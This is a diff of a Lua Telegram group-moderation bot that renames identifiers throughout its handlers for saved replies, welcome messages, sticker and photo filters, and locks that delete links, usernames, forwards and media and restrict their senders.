-local keko2 = redis:get('MohaMeD:'..bot_id..'nkeko'..msg.sender_user_id_..'')
-if keko2 == 'mmsg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'nahmad'..msg.sender_user_id_..'')
+if ahmad2 == 'mmsg' then
 send(msg.chat_id_, msg.id_, 1, '• `تم حفظ الاسم يمكنك اظهار الجه بـ ارسال امر المطور` ☑', 1, 'md')
-redis:set('MohaMeD:'..bot_id..'nkeko'..msg.sender_user_id_..'', 'no')
-redis:set('MohaMeD:'..bot_id..'nakeko', text)
-local nmkeko = redis:get('MohaMeD:'..bot_id..'nmkeko')
-sendContact(msg.chat_id_, msg.id_, 0, 1, nil, nmkeko, text , "", bot_id)
+redis:set('MohaMeD:'..bot_id..'nahmad'..msg.sender_user_id_..'', 'no')
+redis:set('MohaMeD:'..bot_id..'naahmad', text)
+local nmahmad = redis:get('MohaMeD:'..bot_id..'nmahmad')
+sendContact(msg.chat_id_, msg.id_, 0, 1, nil, nmahmad, text , "", bot_id)
 return false 
 end
 end
 ------------------------------------------------------------------------
-if text and database:get("keko:set:ttt:p"..bot_id..msg.sender_user_id_) then 
+if text and datahmade:get("ahmad:set:ttt:p"..bot_id..msg.sender_user_id_) then 
 send(msg.chat_id_, msg.id_, 1, '📥┇اراسل لان النص الذي يضهر', 1, 'md')
-database:set("keko:set:ttt:p2"..bot_id..msg.sender_user_id_,true)
-database:set("keko:set:ttt:ppp:"..bot_id..msg.sender_user_id_,text)
-database:del("keko:set:ttt:p"..bot_id..msg.sender_user_id_)
+datahmade:set("ahmad:set:ttt:p2"..bot_id..msg.sender_user_id_,true)
+datahmade:set("ahmad:set:ttt:ppp:"..bot_id..msg.sender_user_id_,text)
+datahmade:del("ahmad:set:ttt:p"..bot_id..msg.sender_user_id_)
 end
 ------------------------------------------------------------------------
-if text and database:get("keko:set:ttt:p2"..bot_id..msg.sender_user_id_) then 
+if text and datahmade:get("ahmad:set:ttt:p2"..bot_id..msg.sender_user_id_) then 
 send(msg.chat_id_, msg.id_, 1, '☑┇تم الحفط', 1, 'md')
-keko = database:get("keko:set:ttt:ppp:"..bot_id..msg.sender_user_id_)
-database:sadd("keko:all:pppp:tt:"..bot_id,keko)
-database:set("keko:set:text:p"..bot_id..keko,text)
-database:del("keko:set:ttt:p2"..bot_id..msg.sender_user_id_)
+ahmad = datahmade:get("ahmad:set:ttt:ppp:"..bot_id..msg.sender_user_id_)
+datahmade:sadd("ahmad:all:pppp:tt:"..bot_id,ahmad)
+datahmade:set("ahmad:set:text:p"..bot_id..ahmad,text)
+datahmade:del("ahmad:set:ttt:p2"..bot_id..msg.sender_user_id_)
 end 
 ------------------------------------------------------------------------
-if text and database:get("keko:set:ttt:p:Del"..bot_id..msg.sender_user_id_) then 
+if text and datahmade:get("ahmad:set:ttt:p:Del"..bot_id..msg.sender_user_id_) then 
 send(msg.chat_id_, msg.id_, 1, '📥┇اراسل لان التص الذي يضهر', 1, 'md')
-database:del("keko:set:text:p"..bot_id..text)
-database:srem('keko:all:pppp:tt:'..bot_id,text)
-database:del("keko:set:ttt:p:Del"..bot_id..msg.sender_user_id_)
-return "keko"
+datahmade:del("ahmad:set:text:p"..bot_id..text)
+datahmade:srem('ahmad:all:pppp:tt:'..bot_id,text)
+datahmade:del("ahmad:set:ttt:p:Del"..bot_id..msg.sender_user_id_)
+return "ahmad"
 end
 ------------------------------------------------------------------------
-if text and database:get("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
-database:del("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+if text and datahmade:get("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
+datahmade:del("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 send(msg.chat_id_, msg.id_, 1,  '☑┇ تم الحفض بنجاح', 1, 'md')
-database:set("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_,text)
+datahmade:set("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_,text)
 end
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-local keko2 = redis:get('MohaMeD:'..bot_id..'h44'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'h44'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
 redis:set('MohaMeD:'..bot_id..'h44'..msg.sender_user_id_..'', 'no')
 redis:set('MohaMeD:'..bot_id..'h4', text)
@@ -1538,8 +1384,8 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-local keko2 = redis:get('MohaMeD:'..bot_id..'h33'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'h33'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
 redis:set('MohaMeD:'..bot_id..'h33'..msg.sender_user_id_..'', 'no')
 redis:set('MohaMeD:'..bot_id..'h3', text)
@@ -1549,8 +1395,8 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-local keko2 = redis:get('MohaMeD:'..bot_id..'h22'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'h22'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
 redis:set('MohaMeD:'..bot_id..'h22'..msg.sender_user_id_..'', 'no')
 redis:set('MohaMeD:'..bot_id..'h2', text)
@@ -1560,8 +1406,8 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-local keko2 = redis:get('MohaMeD:'..bot_id..'h11'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'h11'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
 redis:set('MohaMeD:'..bot_id..'h11'..msg.sender_user_id_..'', 'no')
 redis:set('MohaMeD:'..bot_id..'h1', text)
@@ -1571,8 +1417,8 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-local keko2 = redis:get('MohaMeD:'..bot_id..'hhh'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'hhh'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
 redis:set('MohaMeD:'..bot_id..'hhh'..msg.sender_user_id_..'', 'no')
 redis:set('MohaMeD:'..bot_id..'help', text)
@@ -1581,8 +1427,8 @@ return false
 end
 end
 ------------------------------------------------------------------------
-local keko2 = redis:get('MohaMeD:'..bot_id..'hres1'..msg.sender_user_id_..'')
-if keko2 == 'msg' then
+local ahmad2 = redis:get('MohaMeD:'..bot_id..'hres1'..msg.sender_user_id_..'')
+if ahmad2 == 'msg' then
 if text:match("^(.*)$") then
 send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
 redis:set('MohaMeD:'..bot_id..'hres1'..msg.sender_user_id_..'', 'no')
@@ -1593,12 +1439,12 @@ end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageChatJoinByLink" then
-if database:get("lock_kansers:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_kansers:MohaMeD"..msg.chat_id_..bot_id) then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 local last_ = data.last_name_ or ''
 local first_ = data.first_name_ or ''
 taha = (first_..''..last_)
-Num = (database:get('MohaMeD:'..bot_id..'Num:kansers'..msg.chat_id_) or 25)
+Num = (datahmade:get('MohaMeD:'..bot_id..'Num:kansers'..msg.chat_id_) or 25)
 if string.len(taha) > tonumber(Num) then
 send(msg.chat_id_, msg.id_, 1, '📛┇ عذرا غير مرحب بك هنا',1, 'md')
 chat_kick(msg.chat_id_, msg.sender_user_id_)
@@ -1607,8 +1453,8 @@ end,nil)
 return false
 end
 function get_welcome(extra,result,success)
-if database:get('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_) then
-text = database:get('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_)
+if datahmade:get('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_) then
+text = datahmade:get('MohaMeD:'..bot_id..'welcome:'..msg.chat_id_)
 else
 text = '👋🏻┇اهلا بك يا ؛ {fr}\n🙋🏼‍♂️┇نورت الكروب ؛ @{us}'
 end
@@ -1617,13 +1463,13 @@ local text = text:gsub('{ls}',(result.last_name_ or 'لا يوجد'))
 local text = text:gsub('{us}',(result.username_ or 'لا يوجد'))
 send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
-if database:get('MohaMeD:'..bot_id.."welcome"..msg.chat_id_) then
+if datahmade:get('MohaMeD:'..bot_id.."welcome"..msg.chat_id_) then
 getUser(msg.sender_user_id_,get_welcome)
 end 
 end
 ------------------------------------------------------------------------
 if text and not is_mod(msg) then  
-local taha = database:get('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..text..msg.chat_id_)   
+local taha = datahmade:get('MohaMeD:'..bot_id.."filtr1:add:reply:rd"..text..msg.chat_id_)   
 if taha then    
 function get_info(arg,data)
 if data.username_ ~= false then
@@ -1639,7 +1485,7 @@ end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == 'MessageSticker' and not is_owner(msg) then 
-local filter = database:smembers('MohaMeD:'..bot_id.."filtersteckr"..msg.chat_id_)
+local filter = datahmade:smembers('MohaMeD:'..bot_id.."filtersteckr"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.sticker_.set_id_ then
 function get_info(arg,data)
@@ -1657,7 +1503,7 @@ end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == 'MessagePhoto' and not is_owner(msg) then 
-local filter = database:smembers('MohaMeD:'..bot_id.."filterphoto"..msg.chat_id_)
+local filter = datahmade:smembers('MohaMeD:'..bot_id.."filterphoto"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.photo_.id_ then
 function get_info(arg,data)
@@ -1675,7 +1521,7 @@ end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == 'MessageAnimation' and not is_owner(msg) then 
-local filter = database:smembers('MohaMeD:'..bot_id.."filteranimation"..msg.chat_id_)
+local filter = datahmade:smembers('MohaMeD:'..bot_id.."filteranimation"..msg.chat_id_)
 for k,v in pairs(filter) do
 if v == msg.content_.animation_.animation_.persistent_id_ then
 function get_info(arg,data)
@@ -1693,8 +1539,8 @@ end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessagePinMessage" then
-if database:get('MohaMeD:'..bot_id..'pinnedmsg'..msg.chat_id_) and database:get("lock_pin:MohaMeD"..msg.chat_id_..bot_id) then
-local pin_id = database:get('MohaMeD:'..bot_id..'pinnedmsg'..msg.chat_id_)
+if datahmade:get('MohaMeD:'..bot_id..'pinnedmsg'..msg.chat_id_) and datahmade:get("lock_pin:MohaMeD"..msg.chat_id_..bot_id) then
+local pin_id = datahmade:get('MohaMeD:'..bot_id..'pinnedmsg'..msg.chat_id_)
 pin(msg.chat_id_,pin_id,0)
 end
 end
@@ -1702,20 +1548,20 @@ end
 if not is_vip(msg) then 
 ------------------------------------------------------------------------
 if text and (text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match(".[Ii][Rr]") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Oo][Rr][Gg]") or text and text:match(".[Ii][Nn][Ff][Oo]") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Tt][Kk]")) then
-if database:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.caption_ then
 text = msg.content_.caption_
 if text and (text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match(".[Ii][Rr]") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Oo][Rr][Gg]") or text and text:match(".[Ii][Nn][Ff][Oo]") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Tt][Kk]")) then
-if database:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 end
@@ -1723,183 +1569,183 @@ end
 if msg.content_.caption_ then
 local text = msg.content_.caption_
 if text and text:match("(.*)(@)(.*)")  then
-if database:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)(@)(.*)")  then
-if database:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
-if database:get("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_chat.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)(/)(.*)")  then
-if database:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_sarha.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)(#)(.*)")  then
-if database:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)(#)(.*)")  then
-if database:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_tag.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.forward_info_ then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
-if database:get("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_fwd.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end 
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageSticker" then
-if database:get("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_stecker.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageUnsupported" then
-if database:get("lock_note.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_note.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessagePhoto" then
-if database:get("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_photo.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageAudio" then
-if database:get("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_audeo.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageVoice" then
-if database:get("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_voice.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageVideo" then
-if database:get("lock_video.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_video.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageAnimation" then
-if database:get("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_gif.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageContact" then
-if database:get("lock_contect.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_contect.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("[\216-\219][\128-\191]") then
-if database:get("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_ar.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageDocument" then
-if database:get("lock_files.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_files.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
